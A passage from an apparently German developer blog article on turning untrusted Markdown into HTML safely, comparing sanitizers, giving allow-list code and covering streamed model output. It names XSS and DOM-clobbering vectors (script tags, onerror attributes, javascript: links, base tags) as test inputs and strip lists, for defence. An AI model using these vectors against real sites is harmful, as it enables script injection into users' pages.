| DOM-Clobbering über `id` oder `name` | `<a id="config">`, das ein Global verdeckt | ids mit Präfix versehen oder entfernen |
| Verschachtelung, die tief genug ist, um den Stack zu erschöpfen | Hunderte verschachtelter Blockzitate | Eine Verschachtelungsgrenze im Parser, vor dem Bereiniger |

Der vollständige Fall dafür, das als Positivliste statt als Sperrliste zu bauen, ist ein eigener
Artikel; die Kurzfassung ist, dass eine Sperrliste eine Liste der Angriffe ist, an die jemand schon
gedacht hat.

### Welcher Bereiniger, und wohin er gehört

| Bereiniger | Läuft wo | Braucht ein DOM | Konfiguriert mit | Lizenz |
| --- | --- | --- | --- | --- |
| DOMPurify | Im Browser von Natur aus; in Node mit jsdom | Ja | `ALLOWED_TAGS`, `ALLOWED_ATTR`, `USE_PROFILES`, Hooks | Kostenlos, Apache-2.0 oder MPL-2.0 |
| sanitize-html | Node, und für den Browser gebündelt | Nein — es parst mit htmlparser2 | `allowedTags`, `allowedAttributes`, `allowedSchemes`, `transformTags` | Kostenlos, MIT |
| rehype-sanitize | Überall, wo unified läuft | Nein — es filtert hast | Ein Schema, standardmäßig im GitHub-Stil | Kostenlos, MIT |

(Lizenzen und Konfigurationsoptionen geprüft auf github.com, 9. September 2026. Das separate
Repository von sanitize-html wurde im Februar 2026 archiviert und das Paket in das
ApostropheCMS-Monorepo verschoben, was zu wissen sich lohnt, bevor Sie einen Fehlerbericht gegen das
alte einreichen.)

Wählen Sie danach, wo der Code läuft, nicht nach Reputation. DOMPurify ist die richtige Antwort im
Browser, wo es den Parser des Browsers selbst benutzt und daher genau das sieht, was der Browser
sehen wird — einschließlich der verstümmelten Wiederherstellung, die ein echter Parser bei kaputtem
Markup vornimmt, und genau dort verliert ein Filter, der Zeichenketten vergleicht. Es hat Hooks und
`SANITIZE_NAMED_PROPS` gegen DOM-Clobbering. rehype-sanitize ist die richtige Antwort, wenn Sie schon
eine unified-Pipeline haben, denn es filtert den Baum an seinem Platz und es gibt niemals einen
Moment, in dem unsicheres HTML als Zeichenkette existiert. sanitize-html ist die richtige Antwort,
wenn Sie eine Implementierung brauchen, die sich in Node und im Browser identisch verhält, ohne eine
DOM-Implementierung darunter.

## Darstellen, dann bereinigen, im Browser

DOMPurify ist die Standardwahl. Geben Sie ihm eine ausdrückliche Positivliste statt der
Voreinstellung: Die Positivliste ist das Dokumentformat, das Sie zu unterstützen beschlossen haben.

```js
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export const ALLOWED_TAGS = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr', 'strong', 'em', 'del',
  'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'table', 'thead', 'tbody',
  'tr', 'th', 'td', 'a', 'img', 'input',
];

export const ALLOWED_ATTR = [
  'href', 'src', 'alt', 'title', 'id', 'class', 'target', 'rel',
  'type', 'checked', 'disabled', 'colspan', 'rowspan',
];

export function render(markdown) {
  const html = marked.parse(markdown, { gfm: true });
  return DOMPurify.sanitize(html, { ALLOWED_TAGS, ALLOWED_ATTR });
}
```

Halten Sie beide Arrays in einem Modul und exportieren Sie sie. In dem Moment, in dem dasselbe
Dokument woanders dargestellt wird, müssen sie genau übereinstimmen.

### Dieselbe Positivliste auf dem Server

DOMPurify braucht ein echtes DOM, und der Server hat keines. Ein schlechter Ersatz ist schlimmer als
nichts: Ohne brauchbares DOM gibt DOMPurify die Eingabe unverändert zurück, statt einen Fehler zu
werfen, Script-Tag inklusive. Geben Sie ihm entweder jsdom, oder nehmen Sie einen Bereiniger, der das
HTML selbst parst, wie `xss`.

```js
import { marked } from 'marked';
import { FilterXSS } from 'xss';
import { ALLOWED_ATTR, ALLOWED_TAGS } from './allow-list.js';

const filter = new FilterXSS({
  whiteList: Object.fromEntries(ALLOWED_TAGS.map((tag) => [tag, [...ALLOWED_ATTR]])),
  stripIgnoreTag: true,
  stripIgnoreTagBody: ['script', 'style', 'iframe', 'object', 'embed'],
});

export const render = (markdown) =>
  filter.process(marked.parse(markdown, { gfm: true }));
```

`stripIgnoreTag` entfernt ein unbekanntes Tag, statt es zu maskieren, was die Voreinstellung ist;
`stripIgnoreTagBody` nimmt auch seinen Inhalt mit, sodass ein entferntes `<script>` keinen Quelltext
zurücklässt. Das `xss`-Paket ist kostenlos und MIT-lizenziert und parst das HTML selbst, statt nach
einem DOM zu fragen, was es in einer Funktion ohne jsdom benutzbar macht (`FilterXSS`, `whiteList`,
`stripIgnoreTag` und `stripIgnoreTagBody` geprüft auf github.com, 9. September 2026).

So ist TransformPipe gebaut: marked für den Parse, DOMPurify im Browser, das `xss`-Paket auf dem
Server, eine Positivliste, die von beiden importiert wird, sodass ein Dokument in der Anwendung und
auf einer geteilten Seite gleich aussieht. Ein Detail, das es wert ist, geklaut zu werden:
Überschriften-ids bekommen ein `doc-`-Präfix. Eine id wird zu einer benannten Eigenschaft auf
`window`, und DOMPurify entfernt ids, die nach einem Clobbering-Risiko aussehen, während ein
parserbasierter Bereiniger sie behält — das Präfix beendet beide Probleme. Der Fall für Positivlisten
steht in [Markdown sicher bereinigen](/blog/sanitising-markdown-safely); dieselben zwei Schritte in
Python stehen in [Markdown in Python zu HTML](/blog/markdown-to-html-in-python).

## Modellausgabe darstellen, während sie strömt

Die Hälfte des im Browser dargestellten Markdown kommt heute in Häppchen von wenigen Zeichen an, von
einem Modell, über einen Strom. Jeder naive Ansatz dafür ist derselbe Ansatz: Das Häppchen an einen
Puffer anhängen, den ganzen Puffer neu darstellen, `innerHTML` setzen. Es funktioniert in einer Demo
und es scheitert auf vier bestimmte Weisen.

**Das Dokument ist die meiste Zeit syntaktisch ungültig.** Markdown hat keinen teilweisen Parse. Ein
Puffer, der mit einem Zaunbeginn endet, bedeutet, dass alles danach ein Codeblock ist, sodass eine
Tabelle, die in einem eingezäunten Beispiel ankommt, als Code erscheint, dann als Tabelle, dann
wieder als Code, wenn der schließende Zaun eintrifft. Ein halb getipptes `[label](htt` ist einen
Frame lang wörtlicher Text und im nächsten ein Link. Eine Tabelle, deren Trennzeile noch nicht
angekommen ist, ist ein Absatz aus Pipe-Zeichen. Ein einzelnes `*` am Ende des Puffers ist ein
wörtliches Sternchen, bis sein Partner erscheint und der Rest des Absatzes kursiv wird. Nichts davon
ist ein Parser-Fehler — der Parser stellt korrekt ein Dokument dar, das wirklich unvollständig ist.

**`innerHTML` in jedem Frame zu ersetzen zerstört den Zustand der Seite.** Die Textauswahl geht
verloren, ein offenes `<details>` schließt sich, der Fokus wandert, und ein Nutzer, der nach oben
gescrollt hat, um etwas zu lesen, wird wieder nach unten gerissen. Es ist außerdem das Teuerste, was
Sie pro Token tun können, denn Sie werfen ein DOM weg, das Sie fast identisch wieder aufbauen werden.

**Die Kosten sind quadratisch.** Den ganzen Puffer bei jedem Häppchen neu zu parsen und neu zu
bereinigen bedeutet, dass die Arbeit pro Häppchen mit der Länge der Antwort wächst. Eine kurze
Antwort ist in Ordnung; bei einer zweitausend Wörter langen mit hundert Häppchen leistet jede der
letzten hundert Darstellungen fast die ganze Arbeit der endgültigen.

**Es ist leicht, das Bereinigen bei den Zwischendarstellungen zu überspringen.** Nur das endgültige
HTML zu bereinigen ist ein Loch mit einer Zeitschaltuhr daran: Jeder Frame vor dem letzten hat
unbereinigtes HTML in die Seite gestellt, und ein `onerror`-Handler feuert in dem Moment, in dem er
geparst wird, nicht wenn der Strom endet.

Was stattdessen funktioniert, ist eine kleine Menge von Regeln:

1. **Auf eine Uhr darstellen, nicht auf ein Häppchen.** Fassen Sie Häppchen zusammen und stellen Sie
   höchstens einmal pro Animationsframe dar, oder alle 50 bis 100 Millisekunden. Der Text kommt
   schneller an, als irgendjemand liest.
2. **Den Puffer in Gesetztes und Lebendiges teilen.** Alles bis zur letzten Leerzeile, die nicht in
   einem offenen Zaun liegt, wird sich nicht mehr ändern. Stellen Sie das einmal dar, behalten Sie es
   im DOM und stellen Sie nur den Schwanz danach neu dar. Das macht aus den quadratischen Kosten
   wieder lineare.
3. **Den Zaunzustand selbst verfolgen.** Zählen Sie die Zaunbeginne im Puffer; ist die Zahl ungerade,
   sind Sie in einem Codeblock. Schließen Sie ihn für die Zwischendarstellung entweder, oder stellen
   Sie den Schwanz als einfaches `<pre>` dar, bis der echte schließende Zaun ankommt. Beides ist
   ruhiger, als den Parser raten zu lassen.
4. **Jede Darstellung bereinigen, nicht nur die letzte.** Die Positivliste kostet Mikrosekunden
   gegen einen Schwanz von wenigen hundert Zeichen. Es gibt keine Fassung davon, in der eine
   teilweise Darstellung ausgenommen ist.
5. **Einen Komponenten-Renderer vorziehen, wenn Sie in React sind.** `react-markdown` gleicht ein
   virtuelles DOM gegen das vorige ab und bessert die Differenz aus, was genau das Problem ist, das
   Streaming erzeugt, und deshalb hält es unter einem Strom, wo eine rohe `innerHTML`-Schleife das
   nicht tut.
6. **Nicht auf einen Syntaxbaum wechseln in der Erwartung, dass er hilft.** unified parst ebenfalls
   von vorn. Ein Baum kauft Ihnen Umformungen, kein inkrementelles Parsen.

Wenn der Strom endet und Sie den endgültigen Text haben, stellen Sie ihn noch einmal von oben sauber
dar. Diese letzte Darstellung ist die, die gespeichert, kopiert oder exportiert wird, und sie sollte
die Kompromisse nicht tragen, die die lebendige brauchte —
[Modellausgabe in eine Seite verwandeln, die jemand lesen kann](/blog/ai-output-to-a-shareable-page)
ist eine andere Aufgabe, als sie beim Ankommen anzuzeigen.

## Wo ein Syntaxbaum die falsche Antwort ist

Die unified-Pipeline ist hier die fähigste Option, und sie standardmäßig zu empfehlen ist der
häufigste Fehler in diesem Thema. Sie kostet mehr, als ihre Fürsprecher sagen, auf vier Weisen.

**Es sind sieben Abhängigkeiten, bevor Sie eine Zeile schreiben.** `unified`, `remark-parse`,
`remark-gfm`, `remark-rehype`, `rehype-raw`, `rehype-sanitize`, `rehype-stringify` — jede mit ihrem
eigenen Veröffentlichungsrhythmus, ihrem eigenen Änderungsprotokoll und ihrer eigenen Hauptversion,
die sich irgendwann ohne die anderen bewegt. marked ist ein Paket. In einer Anwendung mit einer
Sicherheitsprüfung, einer Lieferketten-Richtlinie oder einer Lockfile, die jemand wirklich liest,
sind sieben gegen eins eine Zahl, die zur Sprache kommt.

**Es ist nur ESM.** Die Pakete sagen es selbst. In einem modernen Build ist das kein Thema; in einem
CommonJS-Dienst, einem älteren Bundler oder einem vor Jahren konfigurierten Test-Runner ist es ein
Arbeitstag, der nichts mit Markdown zu tun hat.

**Es ist mehr, was zur Importzeit aufgelöst und ausgeführt werden muss.** Sieben Pakete und ihre
eigenen Abhängigkeiten müssen gefunden und ausgeführt werden, bevor das erste Dokument geparst wird,
wo marked eines ist. Wir haben den Unterschied nicht gemessen und würden Sie nicht bitten, unserer
Zahl zu vertrauen, wenn wir es hätten; die Form der Kosten ist, was zählt. Auf einem lange laufenden
Server wird sie einmal bezahlt und verschwindet; in einer serverlosen Funktion wird sie bei jedem
Kaltstart bezahlt, pro Region, für immer.

**Es hat eine echte Lernkurve für eine kleine erste Aufgabe.** Jedem `<h2>` eine Klasse hinzuzufügen
heißt zu wissen, dass dies eine hast-Aufgabe ist und keine mdast-Aufgabe, dass Sie ein Plugin wollen,
das einen Transformer zurückgibt, dass `unist-util-visit` ein separates Paket ist und dass
Knoteneigenschaften `properties` heißen, mit `className` als Array. Die entsprechende
markdown-it-Renderer-Regel ist vier Zeilen lang und braucht einen Begriff. Wenn Ihre Liste der
Umformungen "ids an Überschriften hängen" und "`rel` an externe Links hängen" lautet, tun beide
anderen Bibliotheken das ohne Baum, und Sie werden einen Compiler installiert haben, um zwei
Zeichenketten zu ändern.

Das Umgekehrte gilt auch, und es ist der Fehlschlag, vor dem dieser Artikel in der anderen Richtung
warnen will: Wenn Sie sich dabei erwischen, einen regulären Ausdruck über dargestelltes HTML laufen
zu lassen — `<h2>` ersetzen, `<a href="` finden, `<img` zählen —, dann brauchten Sie den Baum und
haben einen schlechteren gebaut. HTML ist keine reguläre Sprache, und jede dieser Ersetzungen ist
korrekt, bis jemand einen Codeblock schreibt, der die Zeichenkette enthält, auf die Sie passen.

Die ehrliche Position ist, dass die meisten Seiten ein Dokument einmal darstellen und es nie
umformen. Für diese Seiten ist die Pipeline Einrichtungscode, den Sie für immer lesen, ohne Gewinn,
und die richtige Antwort ist die kleine Bibliothek plus ein Bereiniger. Greifen Sie zu unified, wenn
Sie die Umformung benennen können, nicht wenn Sie vermuten, dass Sie eine wollen könnten.

## Wie man wählt

1. **Entscheiden Sie, ob Sie das Dokument umformen oder nur darstellen werden.** Wenn irgendwo in
   Ihren Anforderungen eine Umformung steht, wählen Sie jetzt einen Baum, denn ihn nachzurüsten
   heißt, jede Anpassung neu zu schreiben, die Sie gegen Token oder Renderer-Methoden gemacht haben.
2. **Passen Sie den Dialekt zu den Dateien, die Sie tatsächlich haben.** Wandeln Sie ein echtes
   Dokument um — eines mit einer Tabelle, einer Aufgabenliste und einer Fußnote —, bevor Sie sich
   festlegen, denn eine fehlende Erweiterung wirft keinen Fehler, sie stellt Ihre Tabelle als Absatz
   aus Pipes dar.
3. **Wählen Sie den Bereiniger vor dem Parser.** Der Bereiniger muss überall laufen, wo der Parser
   läuft, und DOMPurify ohne DOM gibt Ihre Eingabe unverändert zurück, sodass diese Beschränkung mehr
   über die Form Ihres Codes entscheidet als die Wahl des Parsers.
4. **Zählen Sie die Laufzeiten.** Im Browser und auf dem Server darzustellen heißt eine Positivliste,
   die von beiden importiert wird, und ein Unterschied zwischen den beiden zeigt sich als ein
   Dokument, das geteilt anders aussieht als beim Schreiben — was sich für die Person, die es
   geschrieben hat, wie Datenverlust liest.
5. **Benennen Sie, wer die Eingabe schreibt.** Wenn es Ihr eigenes Team mit Commit-Zugang ist, stehen
   Ihnen MDX und rohes HTML offen. Wenn es irgendjemand sonst ist, stehen sie nicht offen, und keine
   Sorgfalt in der Konfiguration ändert diese Antwort.
6. **Sehen Sie sich an, was Sie überschreiben müssen.** Schreiben Sie die vier Dinge auf, von denen
   Sie schon wissen, dass Sie sie brauchen — Überschriften-ids, Umgang mit externen Links,
   Code-Hervorhebung, verzögertes Laden von Bildern —, und prüfen Sie jedes gegen die
   Erweiterungspunkte der Bibliothek, bevor Sie wählen, nicht danach.
7. **Testen Sie mit einer feindlichen Datei, nicht mit einer README.** Ein Dokument, das `<script>`,
   ein `onerror`-Attribut, einen `javascript:`-Link und ein `<base>`-Tag enthält, kostet eine Minute
   zu schreiben und sagt Ihnen mehr über Ihre Pipeline als eine Woche des Darstellens Ihrer eigenen
   Dokumentation.

## Was man damit macht

Schreiben Sie die Positivliste vor dem Renderer und rufen Sie den Bereiniger in derselben Funktion
wie den Parse auf, damit niemand das eine ohne das andere erreichen kann. Liefern Sie von Nutzern
gelieferte Ausgabe außerdem unter einer Content Security Policy aus: `script-src 'none'` kostet
nichts auf einer Seite, die immer nur ein Dokument ist. Wenn die Eingabe eine Word-Datei statt
Markdown ist, ist das eine andere Bibliothek und eine andere Menge von Fehlschlägen —
[mammoth und die anderen docx-Parser](/blog/mammoth-js-and-docx-parsers) behandeln das. Wählen Sie
dann nach der Form des Problems statt nach der Beliebtheit der Antwort: marked für eine Zeichenkette,
markdown-it für ein Plugin, unified für einen Baum, react-markdown für Komponenten, und einen eigenen
Bereiniger in allen vier Fällen. Wenn Sie das HTML einmal brauchten statt einer Bibliothek in Ihrem
Bundle, [führt diese Umwandlung](/) dieselben zwei Schritte in Ihrem Browser aus und gibt eine
eigenständige Datei zurück.

## FAQ

### Was ist schneller, marked oder markdown-it?

Wir haben keinen Benchmark laufen lassen, und Sie sollten nicht nach dem von jemand anderem wählen.
Beide sind ausgereifte Parser, für dieselbe Aufgabe geschrieben, und in jeder interaktiven Verwendung
— ein Vorschaubereich, ein Kommentarfeld, eine Seite — ist der Unterschied nicht das, was Sie
bemerken. Zu messen lohnt es sich erst, wenn Sie Tausende von Dokumenten in einem Build darstellen,
und dann messen Sie Ihre eigenen Dokumente, denn die Antwort hängt davon ab, was in ihnen steht, und
nicht von einer Zahl aus einer README im Repository.

### Ist marked sicher für nicht vertrauenswürdiges Markdown?

Nicht für sich allein. Seine README sagt unumwunden, dass es seine Ausgabe nicht bereinigt, und
verweist Sie auf DOMPurify, sanitize-html oder insane (geprüft auf github.com, 9. September 2026).
Die alte `sanitize`-Option ist entfernt worden, Code, der sie übergibt, wird also stillschweigend
ignoriert, was schlimmer ist, als keinen Schutz zu haben, weil es wie Schutz aussieht.

### Wie hänge ich ids an Überschriften für ein Inhaltsverzeichnis?

In marked überschreiben Sie die `heading`-Renderer-Methode oder fügen das Paket
`marked-gfm-heading-id` hinzu. In markdown-it nehmen Sie ein Anker-Plugin oder überschreiben die
`heading_open`-Renderer-Regel. In unified fügen Sie ein Plugin hinzu, das den Baum durchläuft. Was
Sie auch wählen: Versehen Sie die id mit einem Präfix — eine nackte id wird zu einer benannten
Eigenschaft auf `window`, und ein Präfix wie `doc-` beendet sowohl die Kollision als auch das
Clobbering-Risiko.

### Warum erscheint meine Tabelle als Absatz aus Pipes?

Tabellen stehen nicht in CommonMark, ein streng konformer Parse erzeugt also keine. Prüfen Sie `gfm`
in marked, prüfen Sie, dass Sie in markdown-it nicht das `commonmark`-Preset gewählt haben, und
prüfen Sie, dass `remark-gfm` in Ihrer unified-Pipeline steht. Der Fehlschlag ist von Entwurf her
still: Eine Tabelle, die der Parser nicht erkennt, ist ein gültiger Absatz.

### Brauche ich rehype-raw?

Nur wenn das Markdown rohes HTML enthält, das Sie dargestellt haben wollen. `remark-rehype` verwirft
rohes HTML andernfalls, was die sichere Voreinstellung ist. Wenn Sie es doch hinzufügen, brauchen Sie
auch `allowDangerousHtml` an `remark-rehype` und danach `rehype-sanitize` nach beiden — die Mitte
dieser Folge ist der Teil, in dem ein unbereinigtes Dokument existiert.

### Kann ich diese Bibliotheken im Browser ohne Bundler benutzen?

Ja. marked, markdown-it, micromark und snarkdown laufen alle im Browser und können von einem CDN als
ES-Module geladen werden. Die unified-Pakete sind nur ESM, was sie als Module unkompliziert und als
Script-Tag unhandlich macht. Denken Sie daran, dass ein Bereiniger auch geladen werden muss — ein
Renderer allein auf der Seite ist das Loch, um das es in diesem Artikel geht.

### Was ist der Unterschied zwischen remark und rehype?

Sie sind zwei Hälften derselben Pipeline, die an zwei verschiedenen Bäumen arbeiten. remark arbeitet
an mdast, dem Markdown-Baum, wo die Knoten Überschriften und Listen und Links sind. rehype arbeitet
an hast, dem HTML-Baum, wo die Knoten Elemente mit Tag-Namen und Eigenschaften sind. `remark-rehype`
ist die Brücke, und zu wissen, auf welcher Seite Ihr Problem liegt, ist der größte Teil des Lernens
von unified.
